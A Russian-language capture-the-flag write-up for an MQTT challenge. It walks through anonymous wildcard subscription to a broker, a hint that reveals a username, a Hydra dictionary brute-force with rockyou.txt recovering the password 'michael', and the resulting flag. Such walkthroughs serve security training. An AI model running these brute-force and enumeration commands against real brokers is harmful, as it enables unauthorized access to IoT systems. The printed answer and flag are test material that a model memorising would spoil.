## Описание

Утиный хаб энергосети вышел на связь. В открытом эфире — телеметрия и минутный зов Архитектора. Зажгите огни и получите флаг.

## Write-up

### 1. Подключение и прослушивание эфира (Reconnaissance)
Подключаемся к MQTT-брокеру на порт 1883 без указания учётных данных (анонимно) и оформляем подписку на все топики с помощью подстановочного символа `#`:

```bash
mosquitto_sub -h <HOST> -p 1883 -t '#' -v
```

### 2. Перехват служебного сообщения (Hint Discovery)
Примерно раз в минуту (каждые 60 секунд) брокер осуществляет рассылку служебного уведомления по публичным топикам:

```text
Quack. Chief Architect to lights. The yellow one knows.
```

Анализируем текст сообщения и контекст легенды:
- **Пользователь:** Фразы *«Chief Architect»* («Главный Архитектор») и *«The yellow one knows»* («Жёлтый знает») указывают на создателя и архитектора цифрового Омска — Жёлтую Уточку. Логин учётной записи — `yellow_duck` (сервер также принимает алиасы `duck` и `yellowduck`).
- **Целевой топик:** Указание *«to lights»* («к огням») в инфраструктуре цифрового Омска задаёт закрытый топик управления иллюминацией: `digital_omsk/lights`.

### 3. Проверка прав доступа к закрытому каналу (ACL Check)
Если попытаться подписаться на топик `digital_omsk/lights` анонимно:

```bash
mosquitto_sub -h <HOST> -p 1883 -t 'digital_omsk/lights' -v
```

Брокер отклоняет неавторизованную подписку по правилам ACL. Для чтения сообщений из закрытого канала требуется пройти аутентификацию под учётной записью Архитектора (`yellow_duck`).

### 4. Подбор пароля по словарю (Wordlist / Brute-force)
Для учётной записи `yellow_duck` выполняем атаку по популярному словарю `rockyou.txt` с помощью утилиты Hydra или собственного скрипта:

```bash
hydra -l yellow_duck -P /usr/share/wordlists/rockyou.txt mqtt://<HOST>:1883
```

Среди первых строк словаря `rockyou.txt`:

```text
1: 123456
2: 12345
3: 123456789
4: password
5: iloveyou
6: princess
7: 1234567
8: 12345678
9: abc123
10: nicole
11: daniel
12: babygirl
13: monkey
14: lovely
15: jessica
16: 654321
17: michael
```

17-я строка словаря — пароль `michael`. Подбор успешно завершается на 17-й попытке.

### 5. Авторизация и запуск огней метрополии (Exploitation)
Подключаемся к брокеру под учётной записью `yellow_duck` с паролем `michael` и подписываемся на топик `digital_omsk/lights`:

```bash
mosquitto_sub -h <HOST> -p 1883 -u 'yellow_duck' -P 'michael' -t 'digital_omsk/lights' -v
```

В течение минуты в топик поступает сообщение с флагом активации объекта:

```text
digital_omsk/lights OmFEST{qu4ck_m3tr0p0l1s_l1ghts_1gn1t3d_by_y3ll0w_duck}
```
